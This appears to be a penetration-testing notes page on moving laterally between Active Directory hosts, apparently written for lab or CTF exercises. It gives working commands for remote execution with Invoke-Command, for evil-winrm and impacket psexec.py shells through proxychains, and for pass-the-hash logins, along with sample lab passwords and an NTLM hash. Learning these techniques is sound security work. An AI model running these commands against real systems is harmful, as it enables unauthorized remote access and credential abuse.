---
title: "AD: Connecting to other hosts"
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - linux
  - windows
---
# AD: Connecting to other hosts

!!! quotes "Resources"
	- [TheHacker.recipes](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword

[Index of Active Directory](active-directory.md)

[Hardening and auditing Active Directory ](hardening-auditing-active-directory.md)

!!! tip "Attacking from linux"
	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
	- [Lateral Movement in Active Directory from Linux](active-directory-from-linux-lateral-movement.md)
	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)

!!! tip "Attacking from Windows"
	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
	- [Active directory: connecting to other hosts](active-directory-connections.md)
	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)



## Invoke-Command

Invoke-Command allows the executions of commands in remote hosts. We can use a "nested" Invoke-Command to send credentials (after creating a PSCredential object) with every request. 


```powershell
# 1. Now we will create a Secure-string object with the credential of the user svc_sql. Then we will use Invoke-Command to run a command in the host MS01
# 1. We create a SecureString Object with our creds
$SecPassword = ConvertTo-SecureString '$password' -AsPlainText -Force
# Example: 
# $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('$domain\$userSamAccountName', $SecPassword)
# Example:
# $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

# 2. We send the nested Invoke-Command
Invoke-Command -ComputerName "$hostname.$domainName" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
# Example: 
# Invoke-Command -ComputerName "MS01.INLANEFREIGHT.LOCAL" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
``` 


## Enter-PSSession


## Evil-Winrm

With a pivot host and chisel + proxychains

```powershell
proxychains evil-winrm -i $ip -u $user -p $password
```

With hashes:

```bash
evil-winrm -i $ip -u Administrator -H "32693b11e6aa90eb43d32c72a07ceea6"
```


## psexec.py

With a pivot host and chisel + proxychains 

```powershell
proxychains tools/impacket/examples/psexec.py INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.50
```

Passing a hash:

```bash
python3 psexec.py Administrator@$ip -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```


## mstsc.exe 